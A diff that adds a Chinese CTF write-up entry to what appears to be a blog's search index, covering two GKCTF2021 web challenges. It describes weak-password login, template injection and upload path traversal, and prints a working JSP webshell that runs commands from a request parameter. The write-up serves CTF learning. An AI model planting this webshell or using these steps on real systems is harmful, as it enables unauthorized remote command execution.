@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>菜鸟随笔-GKCTF2021</title>
+      <link href="/2021/06/26/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-GKCTF2021/"/>
+      <url>/2021/06/26/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-GKCTF2021/</url>
+      
+        <content type="html"><![CDATA[<p><strong>上去练了下手，发现自己不会几道题</strong></p><p><strong>又一个拉跨的web手诞生了</strong></p><h1 id="GKCTF2021"><a href="#GKCTF2021" class="headerlink" title="GKCTF2021"></a>GKCTF2021</h1><h1 id="web1-easycms"><a href="#web1-easycms" class="headerlink" title="web1-easycms"></a>web1-easycms</h1><p>web方向的签到题，虽然卡了好几步，但真的简单</p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>进入页面，简单找了一下，首页没什么信息</p><p>测试发现后台为admin.php</p><p><img src="image-20210626190255092.png" alt="image-20210626190255092"></p><p>虽然没有验证码，但这道题输入错误三次就会锁住三分钟，无法进行爆破</p><p>靠猜测可知用户名admin,密码12345</p><h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><p>进入后台，在设计位置可以看到一个首页模板，如果可以写入命令或者一句话，我们就可以得到flag</p><p>这个思路是一次awd给我的启发，当然，网上也有文章提到了这个漏洞</p><p>链接：<a href="http://www.yidianzixun.com/article/0J0BhinZ">http://www.yidianzixun.com/article/0J0BhinZ</a></p><p>直接往模板写，提示需要创建cwqe.txt文件</p><p><img src="image-20210626204300084.png" alt="image-20210626204300084"></p><p>找找有没有可以文件上传的地方</p><p>找了一会，发现素材库位置不但可以上传文件，还可以改路径，完美符合要求</p><p><img src="image-20210626204600943.png" alt="image-20210626204600943"></p><p>上传</p><p><img src="image-20210626205208461.png" alt="image-20210626205208461"></p><p>用目录穿越将文件定位到指定的目录</p><p><img src="image-20210626205322771.png" alt="image-20210626205322771"></p><p>保存成功，当然我第一次做这题先后要求了两个目录，用一样的手法上传即可</p><p>回到首页，首页已经乱码，执行我们的一句话即可</p><p><img src="image-20210626205422342.png" alt="image-20210626205422342"></p><p><img src="image-20210626205637732.png" alt="image-20210626205637732"></p><p>拿到flag</p><h1 id="babycat"><a href="#babycat" class="headerlink" title="babycat"></a>babycat</h1><p>这道题，我不会</p><p>这道题是w4师傅告诉了我非预期，所以我复现了一下，聊以练手</p><h2 id="json格式注册登录"><a href="#json格式注册登录" class="headerlink" title="json格式注册登录"></a>json格式注册登录</h2><p>进入网站，一个注册一个登录，而且注册页面一片空白</p><p><img src="image-20210626211235280.png" alt="image-20210626211235280"></p><p>抓包看看什么情况</p><p><img src="image-20210626211402642.png" alt="image-20210626211402642"></p><p>告诉我们上传格式是data=”json格式的数据”，直接构造payload</p><pre class="line-numbers language-payload"><code class="language-payload">data={"username":"test","password":"test"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210626211651217.png" alt="image-20210626211651217"></p><p>注册成功</p><p><img src="image-20210626211812732.png" alt="image-20210626211812732"></p><p>登录进去有四个链接和一只呆猫</p><p>这里主要有两个地方需要注意，一个是upload，一个是Download Test</p><p>upload可以上传文件，Download Test 可以任意文件读取</p><p>但upload必须以管理员身份登录才可以访问，而非预期，绕过了这个限制</p><h2 id="post绕过身份验证上传文件"><a href="#post绕过身份验证上传文件" class="headerlink" title="post绕过身份验证上传文件"></a>post绕过身份验证上传文件</h2><p>任意文件读取就不提了，非预期用不到</p><p>当然这么说也不对，这个非预期，是将源码用任意文件读取dump下来审计后审出来的</p><p>这里就直接说用法，所以不用任意文件读取了，想学习预期解，请认准出题人w4</p><p>这里先使用postman进入到upload，并上传木马文件</p><pre class="line-numbers language-jsp"><code class="language-jsp"><%    if("023".equals(request.getParameter("pwd"))){        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();        int a = -1;        byte[] b = new byte[2048];        out.print("<pre>");        while((a=in.read(b))!=-1){            out.println(new String(b));        }        out.print("</pre>");    }%><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210627091759686.png" alt="image-20210627091759686"></p><p>上传同时抓包</p><p>然后改路径</p><p><img src="image-20210627091822230.png" alt="image-20210627091822230"></p><p>路径随意，可读取即可</p><p><img src="image-20210627092109632.png" alt="image-20210627092109632"></p><p>命令执行成功，怎么拿flag应该不用我多说，读取/readflag即可</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Linux系统之proc目录解析</title>
       <link href="/2021/06/25/Linux%E7%B3%BB%E7%BB%9F%E4%B9%8Bproc%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90/"/>
       <url>/2021/06/25/Linux%E7%B3%BB%E7%BB%9F%E4%B9%8Bproc%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90/</url>
